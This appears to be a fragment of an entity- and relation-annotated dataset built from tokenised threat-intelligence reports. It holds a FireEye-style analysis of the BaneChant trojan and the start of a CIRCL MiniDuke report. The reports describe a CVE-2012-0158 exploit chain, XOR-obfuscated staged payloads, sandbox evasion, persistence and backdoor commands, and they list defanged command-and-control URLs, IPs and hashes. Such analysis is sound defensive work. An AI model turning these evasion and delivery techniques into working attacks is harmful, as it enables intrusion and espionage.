"Dropper"}], [{"name": "governments of Middle East and Central Asia", "pos": [13, 20], "sent_id": 6, "type": "ExploitTargetObject"}], [{"name": "MSCOMCTL.ocx", "pos": [12, 13], "sent_id": 35, "type": "Payload"}], [{"name": "CVE 2012-0158", "pos": [15, 19], "sent_id": 35, "type": "Vulnerability"}], [{"name": "moo", "pos": [25, 26], "sent_id": 40, "type": "Indicator"}], [{"name": "hxxp://symbisecure.com/update/winword.pkg", "pos": [16, 17], "sent_id": 47, "type": "Indicator"}], [{"name": "winword.pkg", "pos": [3, 4], "sent_id": 58, "type": "Dropper"}], [{"name": "hxxp://kibber.no-ip.org/adserv/logo.jpg", "pos": [2, 3], "sent_id": 66, "type": "Payload"}], [{"name": "Mozilla/4.0", "pos": [7, 8], "sent_id": 66, "type": "Software"}], [{"name": "MSIE 6.0", "pos": [11, 13], "sent_id": 66, "type": "Software"}], [{"name": "Windows NT 5.1", "pos": [14, 17], "sent_id": 66, "type": "Software"}], [{"name": "C:\\ProgramData\\Google2\\GoogleUpdate.exe", "pos": [12, 13], "sent_id": 68, "type": "File"}], [{"name": "GoogleUpdate.exe", "pos": [6, 7], "sent_id": 71, "type": "File"}], [{"name": "hxxp://symbisecure.com/adserv/get.php", "pos": [5, 6], "sent_id": 75, "type": "Indicator"}], [{"name": "Base-64", "pos": [7, 8], "sent_id": 75, "type": "Obfuscation"}], [{"name": "BaneChant", "pos": [14, 15], "sent_id": 76, "type": "Indicator"}], [{"name": "Trojan.APT.BaneChant", "pos": [8, 11], "sent_id": 78, "type": "TrojanHorse"}], [{"name": "GoogleUpdate.exe", "pos": [15, 16], "sent_id": 90, "type": "Payload"}], [{"name": "GoogleUpdate.exe", "pos": [7, 8], "sent_id": 93, "type": "Payload"}]], "labels": [{"r": "P13", "h": 17, "t": 19, "evidence": [78, 93]}, {"r": "P13", "h": 17, "t": 18, "evidence": [78, 90]}, {"r": "P21", "h": 16, "t": 17, "evidence": [76, 78]}, {"r": "P21", "h": 14, "t": 17, "evidence": [75, 78]}, {"r": "P13", "h": 17, "t": 15, "evidence": [75, 78]}, {"r": "P21", "h": 13, "t": 17, "evidence": [71, 78]}, {"r": "P21", "h": 12, "t": 17, "evidence": [68, 78]}, {"r": "P13", "h": 17, "t": 8, "evidence": [66, 78]}, {"r": "P13", "h": 7, "t": 8, "evidence": [58, 66]}, {"r": "P13", "h": 1, "t": 3, "evidence": [5, 35]}, {"r": "P21", "h": 5, "t": 0, "evidence": [0, 40]}, {"r": "P21", "h": 6, "t": 0, "evidence": [0, 47]}], "title": "201304FireEyeTrojanAPTBaneChant", "sents": [["Trojan", ".", "APT.BaneChant", ":", "In", "-", "Memory", "Trojan", "That", "Observes", "for", "Multiple", "Mouse", "Clicks"], ["Summary"], ["Last", "December", ",", "our", "senior", "malware", "researcher", "(", "Mr.", "Abhishek", "Singh", ")", "posted", "an", "article", "about", "a", "Trojan", "which", "could", "detect", "mouse", "clicks", "to", "evade", "sandbox", "analysis", "."], ["Interestingly", ",", "we", "have", "found", "another", "spear", "phishing", "document", "that", "downloads", "malware", "which", "incorporates", "improved", "mouse", "click", "detection", "antisandboxing", "capability", "."], ["It", "also", "leverages", "multiple", "advanced", "evasion", "techniques", "to", "achieve", "stealth", "and", "persistent", "infection", "."], ["The", "name", "of", "malicious", "document", "is", "translated", "to", "be", "\u201c", "Islamic", "Jihad.doc", "\u201d", "."], ["Hence", ",", "we", "suspect", "that", "this", "weaponized", "document", "was", "used", "to", "target", "the", "governments", "of", "Middle", "East", "and", "Central", "Asia", "."], ["This", "new", "malware", "is", "significant", "for", "several", "reasons", ":"], ["It", "detects", "multiple", "mouse", "clicks", ":", "In", "the", "past", ",", "evasion", "methods", "using", "mouse", "clicks", "only", "detected", "a", "single", "click", ",", "making", "the", "malware", "fairly", "easy", "to", "overcome", "."], ["The", "callback", "goes", "to", "a", "legitimate", "URL", ":", "Often", "when", "malware", "performs", "its", "callback", ",", "the", "communication", "goes", "directly", "to", "the", "CnC", "server", "."], ["In", "this", "case", ",", "the", "callback", "goes", "to", "a", "legitimate", "URL", "shortening", "service", ",", "which", "would", "then", "redirect", "the", "communication", "to", "the", "CnC", "server", "."], ["Automated", "blocking", "technologies", "are", "likely", "to", "block", "only", "the", "URL", "shortening", "service", "and", "not", "the", "CnC", "server", "."], ["It", "has", "anti", "-", "forensic", "capability", ":", "This", "malware", "does", "n\u2019t", "kick", "into", "high", "gear", "immediately", "."], ["Instead", "it", "requires", "an", "Internet", "connection", "for", "malicious", "code", "to", "be", "downloaded", "to", "the", "memory", "and", "executed", "."], ["Unlike", "predecessors", "that", "are", "very", "obvious", "and", "immediately", "get", "to", "work", ",", "this", "malware", "is", "merely", "a", "husk", "and", "its", "true", "malicious", "intent", "could", "only", "be", "found", "in", "the", "downloaded", "code", "."], ["This", "prevents", "forensic", "investigators", "from", "extracting", "the", "\u201c", "true", "\u201d", "malicious", "code", "from", "the", "disk", "."], ["Overall", ",", "this", "malware", "was", "observed", "to", "send", "information", "about", "the", "computer", "and", "set", "up", "a", "backdoor", "for", "remote", "access", "."], ["This", "backdoor", "provides", "the", "attacker", "the", "flexibility", "on", "how", "malicious", "activities", "could", "be", "executed", "."], ["Technical", "Analysis", ":"], ["How", "Does", "it", "Work", "?"], ["After", "opening", "this", "malicious", "document", ",", "it", "attempts", "to", "download", "an", "XOR", "encoded", "binary", "(", "using", "a", "two", "byte", "XOR", "key", ")", "for", "the", "stage", "one", "payload", "."], ["It", "was", "also", "observed", "that", "the", "attacker", "leveraged", "a", "shortened", "URL", "to", "\u201c", "hide", "\u201d", "malicious", "domains", "from", "automated", "analysis", "technologies", "."], ["After", "investigation", ",", "the", "malicious", "domain", "was", "analyzed", "to", "be", "recently", "registered", "."], ["See", "Figure", "1", "for", "the", "first", "stage", "download", "scenario", "."], ["Figure", "1", "Stage", "One", "Download"], ["The", "attacker", "has", "designed", "the", "stage", "one", "malware", "to", "be", "merely", "a", "husk", "."], ["Having", "the", "decrypted", "executable", "file", "alone", "would", "not", "be", "useful", "in", "understanding", "its", "intent", "."], ["It", "is", "because", "a", "majority", "of", "the", "malicious", "code", "is", "only", "available", "after", "downloading", "the", "second", "stage", "payload", "."], ["The", "second", "stage", "payload", "was", "available", "as", "a", "fake", "\u201c", "JPEG", "\u201d", "file", "from", "the", "malicious", "server", "."], ["By", "designing", "the", "malware", "this", "way", ",", "it", "makes", "it", "harder", "to", "perform", "incidence", "response", "and", "facilitates", "ease", "of", "update", "of", "malicious", "code", "."], ["Again", ",", "in", "this", "second", "stage", "download", ",", "the", "malicious", "domain", "was", "not", "found", "in", "the", "malware", "."], ["It", "made", "use", "of", "the", "dynamic", "DNS", "service", "provided", "by", "\u201c", "NO", "-", "IP", "\u201d", "to", "indirectly", "access", "the", "malicious", "domain", "."], ["See", "Figure", "2", "for", "the", "second", "stage", "download", "scenario", "."], ["The", "technical", "details", "of", "each", "component", "(", "shellcode", "and", "payload", ")", "will", "be", "further", "elaborated", "."], ["Figure", "2", "Stage", "Two", "Download", "Shellcode", "Analysis"], ["The", "spear", "phishing", "document", "was", "in", "RTF", "format", "which", "as", "designed", "loads", "MSCOMCTL.ocx", "and", "exploits", "CVE", "2012", "-", "0158", "."], ["By", "executing", "return", "at", "0x27606EFF", ",", "it", "will", "load", "EIP", "with", "address", "0x27583C30", "which", "is", "translated", "to", "be", "JMP", "ESP", "to", "execute", "shellcode", "in", "the", "stack", "."], ["See", "the", "figure", "below", "."], ["Figure", "3", "Stack", "Corruption", "To", "\u201c", "JMP", "ESP", "\u201d"], ["Like", "most", "modern", "shellcode", ",", "its", "stub", "decrypts", "its", "body", "using", "a", "simple", "XOR", "key", "(", "see", "Figure", "4", ")", "."], ["By", "stepping", "through", "the", "shellcode", ",", "it", "attempts", "to", "download", "hxxp://ow.ly/iGKKT", "and", "saves", "it", "to", "the", "temp", "directory", "with", "a", "file", "name", "prefixed", "with", "\u201c", "moo", "\u201d", ",", "e.g.", ",", "\u201c", "moo1.tmp", "\u201d", "(", "see", "Figure", "5", ")", "."], ["It", "is", "important", "to", "note", "that", "\u201c", "ow.ly", "\u201d", "is", "not", "a", "malicious", "domain", "."], ["Instead", ",", "it", "is", "a", "URL", "shortening", "server", "."], ["It", "is", "believed", "that", "the", "rational", "for", "such", "indirect", "access", "is", "to", "defeat", "automated", "URL", "blacklisting", "."], ["Figure", "6", "depicts", "how", "a", "malicious", "URL", "could", "be", "shortened", "using", "this", "service", "."], ["Figure", "4"], ["Single", "Byte", "XOR", "Key", "0xF1", "Figure", "5", "URLDownloadToFileA", "Figure", "6", "URL", "Shortening", "Service"], ["From", "the", "network", "traffic", ",", "it", "is", "obvious", "that", "the", "real", "malicious", "content", "is", "located", "at", "hxxp://symbisecure.com/update/winword.pkg", "(", "see", "Figure", "7", ")", "."], ["As", "an", "excecutable", "file", "usually", "contains", "many", "zeros", "in", "series", ",", "the", "zeros", "would", "become", "the", "XOR", "key", "when", "XOR", "encoded", "."], ["For", "example", ",", "0xAA", "xor", "0\u00d700", "equals", "to", "0xAA", "."], ["By", "examining", "the", "content", "using", "a", "hex", "editor", ",", "it", "is", "obvious", "that", "there", "are", "many", "\u201c", "9E", "44", "\u201d", "repeated", "."], ["Hence", ",", "by", "trying", "0x449E", "(", "little", "endian", ")", "as", "an", "XOR", "key", ",", "it", "would", "reveal", "that", "it", "is", "a", "PE", "file", "."], ["At", "offset", "zero", ",", "it", "is", "decrypted", "to", "be", "\u201c", "MZ", "\u201d", ";", "at", "offset", "0x3C", ",", "it", "is", "decrypted", "to", "be", "0x00000E0", ";", "and", "at", "0x000000E0", ",", "it", "is", "decrypted", "to", "be", "PE", "(", "see", "Figure", "8)", "."], ["By", "generalizing", "this", "idea", ",", "the", "single", "or", "double", "byte", "XOR", "key", "can", "be", "seen", "as", "a", "dword", "XOR", "key", "as", "it", "repeats", "over", "itself", "."], ["For", "example", ",", "0x449E", "XOR", "key", "could", "be", "seen", "as", "0x449E449E.", "By", "counting", "the", "DWORD", "with", "the", "highest", "occurance", ",", "it", "could", "be", "a", "probable", "XOR", "key", "if", "the", "file", "is", "XOR", "encrypted", "."], ["This", "should", "work", "for", "samples", "that", "are", "(", "1", ",", "2", "or", "4", ",", "but", "not", "3", "bytes", ")", "XOR", "encrypted", "."], ["Figure", "7", "Stage", "1", "Download", "Content", "Figure", "8"], ["Double", "Byte", "XOR", "Encrypted", "Payload", "Payload", "Analysis"], ["Even", "though", "\u201c", "winword.pkg", "\u201d", "is", "an", "executable", "husk", "to", "host", "malicious", "code", "downloaded", "at", "the", "second", "stage", ",", "it", "contains", "a", "mouse", "-", "click", "check", "to", "detect", "human", "behaviors", "."], ["Only", "if", "the", "number", "of", "left", "clicks", "is", "three", "or", "more", ",", "will", "the", "malware", "proceed", "further", "to", "download", "the", "second", "stage", "payload", "\u2013", "the", "true", "malicious", "code", "(", "see", "Figure", "9", "and", "Figure", "10", ")", "."], ["Figure", "9", "Track", "Number", "of", "Left", "Clicks", "Figure", "10", "Proceed", "If", "Left", "Click", "Count", "Is", "Three", "Or", "More"], ["After", "the", "malware", "detects", "sufficient", "mouse", "clicks", ",", "it", "proceeds", "to", "decrypt", "its", "malicious", "URL", "to", "download", "the", "second", "stage", "payload", "(", "see", "Figure", "11", ")", "."], ["By", "following", "the", "TCP", "stream", "(", "see", "Figure", "12", ")", "and", "examining", "the", "header", "of", "the", "downloaded", "JPG", "file", ",", "it", "is", "obvious", "that", "downloaded", "content", "is", "not", "a", "JPEG", "file", "."], ["By", "doing", "so", ",", "it", "effectively", "downloaded", "an", "executable", "content", "that", "is", "not", "conformed", "to", "PE", "format", "to", "defeat", "network", "binary", "extraction", "."], ["A", "legitimate", "JPG", "file", "should", "contain", "the", "byte", "sequence", "\u201c", "FFD8FFE0xxxx4A46494600", "\u201d", "at", "offset", "zero", ",", "where", "\u201c", "4A464946", "\u201d", "corresponds", "to", "\u201c", "JFIF", "\u201d", "."], ["Below", "is", "the", "hardcoded", "URL", "and", "user", "-", "agent", "that", "is", "used", "by", "this", "malware", "sample", "."], ["URL", ":", "hxxp://kibber.no-ip.org/adserv/logo.jpg", "User", "-", "Agent", ":", "Mozilla/4.0", "(", "compatible", ";", "MSIE", "6.0", ";", "Windows", "NT", "5.1", ";", "SV2", ")", "Figure", "11", "Malicious", "Domain", "Decryption", "Figure", "12", "Fake", "JPG"], ["After", "the", "JPG", "file", "is", "downloaded", "and", "executed", "directly", "in", "the", "memory", ",", "it", "achieves", "persistency", "by", "creating", "a", "shortcut", "link", "file", "at", "the", "start", "up", "folder", "."], ["This", "link", "file", "will", "execute", "a", "copy", "of", "itself", "located", "at", "\u201c", "C:\\ProgramData\\Google2\\GoogleUpdate.exe", "\u201d", "(", "see", "Figure", "13", ")", "."], ["It", "would", "look", "legitimate", "to", "users", "as", "it", "masquerades", "as", "a", "legitimate", "Google", "Updater", "."], ["It", "\u201c", "would", "\u201d", "appear", "normal", "if", "it", "attempts", "to", "access", "the", "Internet", "."], ["In", "comparison", ",", "the", "real", "\u201c", "GoogleUpdate.exe", "\u201d", "resides", "in", "\u201c", "program", "files", "\u201d", "instead", "\u201c", "program", "data", "\u201d", "directory", "(", "see", "Figure", "14", ")", "."], ["Figure", "13", "Persistency", "Mechanism", "Figure", "14", "Genuine", "GoogleUpdate.exe"], ["The", "downloaded", "\u201c", "JPG", "\u201d", "file", "was", "analyzed", "to", "be", "a", "backdoor", "in", "the", "victim", "\u2019s", "machine", "."], ["It", "lists", "the", "running", "processes", ",", "IP", "configuration", ",", "and", "directories", "of", "root", "drives", "(", "C", "to", "H", ")", "as", "depicted", "in", "Figure", "15", "."], ["This", "information", "is", "posted", "to", "hxxp://symbisecure.com/adserv/get.php", "in", "Base-64", "format", "."], ["After", "decoding", ",", "it", "is", "interesting", "that", "it", "begins", "with", "a", "Tag", "named", "\u201c", "BaneChant", "\u201d", "."], ["After", "doing", "a", "quick", "search", ",", "it", "seems", "to", "be", "a", "sound", "track", "composed", "by", "Hans", "Zimmer", "for", "the", "movie", "\u201c", "The", "Dark", "Knight", "Rises", "\u201d", "(", "see", "Figure", "16", ")", "."], ["This", "is", "the", "reason", "we", "name", "this", "malware", "Trojan", ".", "APT.BaneChant", "."], ["Figure", "15", "Commands", "Executed", "Figure", "16"], ["Exfiltrated", "Computer", "Information"], ["As", "depicted", "in", "Figure", "17", ",", "the", "malware", "could", "perform", "other", "tasks", "as", "listed", "below", "."], ["1", "."], ["Command", "\u2018", "g", "\u2019", ":", "Download", "and", "execute", "a", "file", "."], ["The", "downloaded", "file", "has", "a", "temporarily", "file", "name", "prefixed", "with", "\u201c", "java", "\u201d", "."], ["2", "."], ["Command", "\u2018", "i", "\u2019", ":", "Run", "downloaded", "code", "(", "fileless", ")", "as", "a", "separate", "thread", "."], ["The", "user", "-", "agent", "used", "is", "\u201c", "Mozilla/5.0", "(", "Windows", "NT", "5.1", ")", "AppleWebKit/535.1"], ["(", "KHTML", ",", "like", "Gecko", ")", "\u201d", "."], ["3", "."], ["Command", "\u2018", "x", "\u2019", ":", "Download", "and", "execute", ",", "follow", "by", "an", "uninstallation", "of", "\u201c", "GoogleUpdate.exe", "\u201d", "."], ["The", "downloaded", "file", "has", "same", "prefix", "\u201c", "java", "\u201d", "."], ["4", "."], ["Command", "\u2018", "u", "\u2019", ":", "Uninstall", "\u201c", "GoogleUpdate.exe", "\u201d", "Figure", "17", "Backdoor", "Access", "Conclusion"], ["As", "defense", "technologies", "advance", ",", "malware", "also", "evolves", "."], ["In", "this", "instance", ",", "we", "could", "see", "that", "the", "malware", "has", "performed", "a", "number", "of", "tricks", "to", "defeat", "detection", "."], ["It", "attempts", "to", ":", "1", "."], ["Evade", "sandbox", "by", "detecting", "human", "behaviors", "(", "multiple", "mouse", "clicks", ")", ";", "2", "."], ["Evade", "network", "binary", "extraction", "technology", "by", "performing", "multi", "-", "byte", "XOR", "encryption", "on", "executable", "file", ";", "3", "."], ["Social", "engineer", "user", "into", "thinking", "that", "the", "malware", "is", "legitimate", ";", "4", "."], ["Avoid", "forensic", "and", "incidence", "response", "by", "using", "fileless", "malicious", "codes", ";", "and", "5", "."], ["Prevent", "automated", "domain", "blacklisting", "by", "using", "redirection", "via", "URL", "shortening", "and", "Dynamic", "DNS", "services", "."], ["This", "entry", "was", "posted", "in", "Advanced", "Malware", ",", "Targeted", "Attack", "by", "Chong", "Rong", "Hwa", "."], ["Bookmark", "the", "permalink", "."]]}, {"vertexSet": [[{"name": "CIRCL", "pos": [2, 3], "sent_id": 2, "type": "Organization"}], [{"name": "May 30, 2013", "pos": [0, 4], "sent_id": 3, "type": "Time"}], [{"name": "Jul 03, 2014", "pos": [9, 13], "sent_id": 3, "type": "Time"}], [{"name": "July 3, 2014", "pos": [20, 24], "sent_id": 3, "type": "Time"}], [{"name": "Miniduke", "pos": [11, 12], "sent_id": 451, "type": "Malware"}], [{"name": "Kaspersky Labs", "pos": [13, 15], "sent_id": 451, "type": "Organization"}], [{"name": "CIRCL", "pos": [16, 17], "sent_id": 451, "type": "Organization"}], [{"name": "v1.ex_", "pos": [12, 14], "sent_id": 455, "type": "Malware"}], [{"name": "1e1b0d16a16cf5c7f3a7c053ce78f515", "pos": [19, 20], "sent_id": 455, "type": "MD5"}], [{"name": "de8e9def2553f4d211cc0b34a3972d9814f156aa", "pos": [3, 4], "sent_id": 456, "type": "SHA-1"}], [{"name": "a1015f0b99106ae2852d740f366e15c1d5c711f57680a2f04be0283e8310f69e", "pos": [7, 8], "sent_id": 456, "type": "SHA-256"}], [{"name": "Mon Jun 18 16:28:11 2012", "pos": [1, 6], "sent_id": 459, "type": "Time"}], [{"name": "Sample B", "pos": [7, 9], "sent_id": 459, "type": "Malware"}], [{"name": "1a2edd2db71fd41e963011da8caf26cc", "pos": [3, 4], "sent_id": 461, "type": "MD5"}], [{"name": "f344becb220de6\ufb00a4d7223bdb82146d3b1c93ed", "pos": [3, 4], "sent_id": 462, "type": "SHA-1"}], [{"name": "b61d409b6c1066e0c1fc4fe15f6f367be31fa2cc555cfc0ef7eeb8e5759380c0", "pos": [7, 8], "sent_id": 462, "type": "SHA-256"}], [{"name": "Mon Mar 5 14:17:08 2012", "pos": [1, 6], "sent_id": 465, "type": "Time"}], [{"name": "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789$~", "pos": [17, 18], "sent_id": 491, "type": "Obfuscation"}], [{"name": "news.grouptumbler.com", "pos": [2, 3], "sent_id": 565, "type": "Indicator"}], [{"name": "173.194.70.101", "pos": [7, 8], "sent_id": 565, "type": "Address"}], [{"name": "2013\u221203\u221203 0 1 : 5 7 : 3 7", "pos": [15, 24], "sent_id": 565, "type": "Time"}], [{"name": "2013\u221203\u221206 2 3 : 3 4 : 4 7", "pos": [31, 40], "sent_id": 565, "type": "Time"}], [{"name": "200.63.46.33", "pos": [10, 11], "sent_id": 571, "type": "Address"}], [{"name": "2012\u221203\u221214 1 4 : 2 1 : 1 0", "pos": [18, 27], "sent_id": 571, "type": "Time"}], [{"name": "2013\u221202\u221226 2 2 : 0 4 : 0 7", "pos": [34, 43], "sent_id": 571, "type": "Time"}], [{"name": "200.63.46.33", "pos": [7, 8], "sent_id": 576, "type": "Address"}], [{"name": "dvdform . com", "pos": [3, 6], "sent_id": 577, "type": "Indicator"}], [{"name": "2 0 0 . 6 3 . 4 6 . 2 3", "pos": [1, 13], "sent_id": 578, "type": "Address"}], [{"name": "www. dvdform . com", "pos": [13, 18], "sent_id": 578, "type": "Indicator"}], [{"name": "2 0 0 . 6 3 . 4 6 . 2 3", "pos": [1, 13], "sent_id": 579, "type": "Address"}], [{"name": "www. p90xprice . com", "pos": [13, 18], "sent_id": 579, "type": "Indicator"}], [{"name": "2 0 0 . 6 3 . 4 6 . 2 3", "pos": [1, 13], "sent_id": 580, "type": "Address"}], [{"name": "d e x t e r s e a s o n . com", "pos": [13, 27], "sent_id": 580, "type": "Indicator"}], [{"name": "2 0 0 . 6 3 . 4 6 . 2 3", "pos": [1, 13], "sent_id": 581, "type": "Address"}], [{"name": "www. d e x t e r s e a s o n . com", "pos": [13, 29], "sent_id": 581, "type": "Indicator"}], [{"name": "2 0 0 . 6 3 . 4 6 . 2 3", "pos": [1, 13], "sent_id": 582, "type": "Address"}], [{"name": "news . grouptumbler . com", "pos": [13, 18], "sent_id": 582, "type": "Indicator"}], [{"name": "2 0 0 . 6 3 . 4 6 . 2 3", "pos": [1, 13], "sent_id": 583, "type": "Address"}], [{"name": "www. babylearningdvd . com", "pos": [13, 18], "sent_id": 583, "type": "Indicator"}], [{"name": "2 0 0 . 6 3 . 4 6 . 2 3", "pos": [1, 13], "sent_id": 584, "type": "Address"}], [{"name": "t u r b o f i r e c o u p o n . com", "pos": [13, 30], "sent_id": 584, "type": "Indicator"}], [{"name": "2 0 0 . 6 3 . 4 6 . 2 3", "pos": [1, 13], "sent_id": 585, "type": "Address"}], [{"name": "www. t u r b o f i r e c o u p o n . com", "pos": [13, 32], "sent_id": 585, "type": "Indicator"}], [{"name": "2 0 0 . 6 3 . 4 6 . 2 3", "pos": [1, 13], "sent_id": 586, "type": "Address"}], [{"name": "s m a l l v i l l e d v d s e t . com", "pos": [13, 31], "sent_id": 586, "type": "Indicator"}], [{"name": "2 0 0 . 6 3 . 4 6 . 2 3", "pos": [1, 13], "sent_id": 587, "type": "Address"}], [{"name": "www. s m a l l v i l l e d v d s e t . com", "pos": [13, 33], "sent_id": 587, "type": "Indicator"}], [{"name": "2 0 0 . 6 3 . 4 6 . 2 3", "pos": [1, 13], "sent_id": 588, "type": "Address"}], [{"name": "miamivicedvdboxset . com", "pos": [13, 16], "sent_id": 588, "type": "Indicator"}], [{"name": "2 0 0 . 6 3 . 4 6 . 2 3", "pos": [1, 13], "sent_id": 589, "type": "Address"}], [{"name": "www. miamivicedvdboxset . com", "pos": [13, 18], "sent_id": 589, "type": "Indicator"}], [{"name": "2 0 0 . 6 3 . 4 6 . 2 3", "pos": [1, 13], "sent_id": 590, "type": "Address"}], [{"name": "www. sexandthecityondvd . com", "pos": [13, 18], "sent_id": 590, "type": "Indicator"}], [{"name": "2 0 0 . 6 3 . 4 6 . 2 3", "pos": [1, 13], "sent_id": 591, "type": "Address"}], [{"name": "www. sherlockholmesondvd . com", "pos": [13, 18], "sent_id": 591, "type": "Indicator"}], [{"name": "2 0 0 . 6 3 . 4 6 . 2 3", "pos": [1, 13], "sent_id": 592, "type": "Address"}], [{"name": "t r x f o r c e k i t o r i g i n a l . com", "pos": [13, 34], "sent_id": 592, "type": "Indicator"}], [{"name": "2 0 0 . 6 3 . 4 6 . 2 3", "pos": [1, 13], "sent_id": 593, "type": "Address"}], [{"name": "www. t r x f o r c e k i t o r i g i n a l . com", "pos": [13, 36], "sent_id": 593, "type": "Indicator"}], [{"name": "2 0 0 . 6 3 . 4 6 . 2 3", "pos": [1, 13], "sent_id": 594, "type": "Address"}], [{"name": "weddingdressestoday . com", "pos": [13, 16], "sent_id": 594, "type": "Indicator"}], [{"name": "2 0 0 . 6 3 . 4 6 . 2 3", "pos": [1, 13], "sent_id": 595, "type": "Address"}], [{"name": "www. maxheadroomdvdseries . com", "pos": [13, 18], "sent_id": 595, "type": "Indicator"}], [{"name": "2 0 0 . 6 3 . 4 6 . 2 3", "pos": [1, 13], "sent_id": 596, "type": "Address"}], [{"name": "200.63.46.33", "pos": [3, 4], "sent_id": 599, "type": "Address"}], [{"name": "B e l l a Vista , El cangrejo , C a l l e 49 , 0", "pos": [2, 20], "sent_id": 615, "type": "Location"}], [{"name": "PA", "pos": [29, 30], "sent_id": 615, "type": "Country"}], [{"name": "20130311", "pos": [24, 25], "sent_id": 622, "type": "Time"}], [{"name": "20130311", "pos": [35, 36], "sent_id": 622, "type": "Time"}], [{"name": "20080328", "pos": [8, 9], "sent_id": 623, "type": "Time"}], [{"name": "20080328", "pos": [11, 12], "sent_id": 623, "type": "Time"}], [{"name": "Manuel I . Cabrera Ch", "pos": [5, 10], "sent_id": 624, "type": "Person"}], [{"name": "ABUSE@PANAMASERVER.COM", "pos": [2, 3], "sent_id": 625, "type": "Email"}], [{"name": "B e l l a Vista C a l l e 39A y Ave Cuba , 0", "pos": [5, 22], "sent_id": 625, "type": "Location"}], [{"name": "0000 \u2212 Panama \u2212 PA", "pos": [25, 30], "sent_id": 625, "type": "Location"}], [{"name": "PA", "pos": [32, 33], "sent_id": 625, "type": "Country"}], [{"name": "20071004", "pos": [47, 48], "sent_id": 625, "type": "Time"}], [{"name": "20120311", "pos": [50, 51], "sent_id": 625, "type": "Time"}]], "labels": [{"r": "P21", "h": 8, "t": 7, "evidence": [455]}, {"r": "P21", "h": 9, "t": 7, "evidence": [455, 456]}, {"r": "P21", "h": 10, "t": 7, "evidence": [455, 456]}, {"r": "P21", "h": 13, "t": 12, "evidence": [459, 461]}, {"r": "P21", "h": 14, "t": 12, "evidence": [459, 462]}, {"r": "P21", "h": 15, "t": 12, "evidence": [459, 462]}, {"r": "P28", "h": 4, "t": 27, "evidence": [451, 578]}, {"r": "P28", "h": 4, "t": 29, "evidence": [451, 579]}, {"r": "P28", "h": 4, "t": 31, "evidence": [451, 580]}, {"r": "P28", "h": 4, "t": 33, "evidence": [451, 581]}, {"r": "P28", "h": 4, "t": 35, "evidence": [451, 582]}, {"r": "P28", "h": 4, "t": 37, "evidence": [451, 583]}, {"r": "P28", "h": 4, "t": 39, "evidence": [451, 584]}, {"r": "P28", "h": 4, "t": 41, "evidence": [451, 585]}, {"r": "P28", "h": 4, "t": 43, "evidence": [451, 586]}, {"r": "P28", "h": 4, "t": 45, "evidence": [451, 587]}, {"r": "P28", "h": 4, "t": 47, "evidence": [451, 588]}, {"r": "P28", "h": 4, "t": 49, "evidence": [451, 589]}, {"r": "P28", "h": 4, "t": 51, "evidence": [451, 590]}, {"r": "P28", "h": 4, "t": 53, "evidence": [451, 591]}, {"r": "P28", "h": 4, "t": 55, "evidence": [451, 592]}, {"r": "P28", "h": 4, "t": 57, "evidence": [451, 593]}, {"r": "P28", "h": 4, "t": 59, "evidence": [451, 594]}, {"r": "P28", "h": 4, "t": 61, "evidence": [451, 595]}, {"r": "P28", "h": 4, "t": 63, "evidence": [451, 596]}, {"r": "P28", "h": 4, "t": 64, "evidence": [451, 599]}, {"r": "P28", "h": 4, "t": 22, "evidence": [451, 571]}, {"r": "P28", "h": 4, "t": 25, "evidence": [451, 576]}, {"r": "P21", "h": 26, "t": 0, "evidence": [2, 577]}, {"r": "P21", "h": 28, "t": 0, "evidence": [2, 578]}, {"r": "P21", "h": 30, "t": 0, "evidence": [2, 579]}, {"r": "P21", "h": 32, "t": 0, "evidence": [2, 580]}, {"r": "P21", "h": 34, "t": 0, "evidence": [2, 581]}, {"r": "P21", "h": 36, "t": 0, "evidence": [2, 582]}, {"r": "P21", "h": 38, "t": 0, "evidence": [2, 583]}, {"r": "P21", "h": 40, "t": 0, "evidence": [2, 584]}, {"r": "P21", "h": 42, "t": 0, "evidence": [2, 585]}, {"r": "P21", "h": 44, "t": 0, "evidence": [2, 586]}, {"r": "P21", "h": 46, "t": 0, "evidence": [2, 587]}, {"r": "P21", "h": 48, "t": 0, "evidence": [2, 588]}, {"r": "P21", "h": 50, "t": 0, "evidence": [2, 589]}, {"r": "P21", "h": 52, "t": 0, "evidence": [2, 590]}, {"r": "P21", "h": 54, "t": 0, "evidence": [2, 591]}, {"r": "P21", "h": 56, "t": 0, "evidence": [2, 592]}, {"r": "P21", "h": 58, "t": 0, "evidence": [2, 593]}, {"r": "P21", "h": 60, "t": 0, "evidence": [2, 594]}, {"r": "P21", "h": 62, "t": 0, "evidence": [2, 595]}, {"r": "P21", "h": 18, "t": 0, "evidence": [2, 565]}, {"r": "P33", "h": 0, "t": 23, "evidence": [2, 571]}, {"r": "P33", "h": 0, "t": 24, "evidence": [2, 571]}, {"r": "P33", "h": 0, "t": 20, "evidence": [2, 565]}, {"r": "P33", "h": 0, "t": 21, "evidence": [2, 565]}, {"r": "P33", "h": 0, "t": 16, "evidence": [2, 465]}, {"r": "P13", "h": 0, "t": 17, "evidence": [2, 491]}], "title": "201305CIRCLMiniDuke", "sents": [["Analysis", "Report", "(", "TLP", ":", "WHITE", ")"], ["Analysis", "of", "a", "stage", "3", "Miniduke", "sample"], ["Conducted", "by", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg"], ["May", "30", ",", "2013", ",", "with", "an", "update", "on", "Jul", "03", ",", "2014", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "July", "3", ",", "2014", "Contents", "1", "Scope", "of", "work", "3", "2", "Analyzed", "samples", "2.1", "Limitations", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["2.2", "Sharing", ".", ".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], [".", "."], ["3", "4", "4", "3", "Executive", "summary", "4", "4", "Analysis", "4.1", "Summary", ".", ".", ".", ".", ".", ".", ".", "."], ["4.2", "Techniques", "used", ".", ".", ".", "."], ["4.3", "Implemented", "commands", "4.4", "Control", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["4.5", "IOC", ".", ".", ".", ".", ".", ".", ".", ".", ".", ".", "."], ["4.5.1", "Network", ".", ".", ".", ".", "."], ["4.5.2", "Registry", ".", ".", ".", ".", "."], ["4.6", "Persistency", ".", ".", ".", ".", ".", 